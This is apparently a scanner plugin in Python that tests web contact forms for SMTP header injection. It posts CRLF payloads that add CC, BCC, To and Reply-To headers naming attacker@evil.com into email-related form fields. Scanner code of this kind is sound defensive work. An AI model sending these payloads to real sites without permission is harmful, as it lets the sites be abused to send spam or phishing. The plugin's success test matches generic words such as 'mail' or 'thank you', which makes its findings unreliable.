import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class SmtpInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1199
    NAME = 'SMTP / Email Header Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 8.6
    DESCRIPTION = 'Detects SMTP/email header injection vulnerabilities by injecting newline characters (%0d%0a) into contact forms and email-related parameters. SMTP injection allows attackers to send spam, phishing emails, or modify email content.'
    SOLUTION = 'Strip newline characters from all email-related input. Use email libraries that automatically prevent header injection. Validate email format strictly.'
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    INJECTION_PAYLOADS = [
        {'name': 'cc_injection', 'payload': 'test@example.com%0d%0aCC: attacker@evil.com'},
        {'name': 'bcc_injection', 'payload': 'test@example.com%0d%0aBCC: attacker@evil.com'},
        {'name': 'to_injection', 'payload': 'test@example.com%0d%0aTo: attacker@evil.com'},
        {'name': 'subject_injection', 'payload': 'test@example.com%0d%0aSubject: Spam'},
        {'name': 'reply_to', 'payload': 'test@example.com%0d%0aReply-To: attacker@evil.com'},
    ]

    EMAIL_PARAMS = ['email', 'to', 'recipient', 'contact', 'mail', 'from', 'sender', 'message', 'body', 'subject']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                for payload in self.INJECTION_PAYLOADS:
                    for param in self.EMAIL_PARAMS:
                        try:
                            reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5)
                            host_header = target
                            if target in ('127.0.0.1', 'localhost', '::1'):
                                host_header = 'alieninc.tech'

                            body = f'{param}={payload["payload"]}'
                            req = (
                                f'POST /contact HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'Content-Type: application/x-www-form-urlencoded\r\n'
                                f'Content-Length: {len(body)}\r\n'
                                f'Connection: close\r\n\r\n'
                                f'{body}'
                            )
                            writer.write(req.encode())
                            await writer.drain()

                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk: break
                                    response += chunk
                                    if len(response) > 8192: break
                            except asyncio.TimeoutError:
                                pass

                            writer.close()
                            await writer.wait_closed()

                            if response:
                                body_lower = response.lower()
                                injection_indicators = [
                                    b'sent', b'message sent', b'email sent', b'thank you',
                                    b'mail', b'smtp', b'delivered', b'queued',
                                ]
                                if any(ind in body_lower for ind in injection_indicators):
                                    results.append(PluginResult(
                                        vulnerable=True, target=target, port=port_to_check,
                                        cvss_score=self.CVSS_SCORE, severity='high',
                                        description=f'SMTP injection detected with {payload["name"]} via parameter {param}',
                                        solution=self.SOLUTION,
                                        evidence=f'Payload: {payload["name"]} ({payload["payload"]}), parameter: {param}',
                                        references=['https://owasp.org/www-community/attacks/Email_Injection']
                                    ))
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description='No SMTP injection vulnerabilities detected'))
        return results
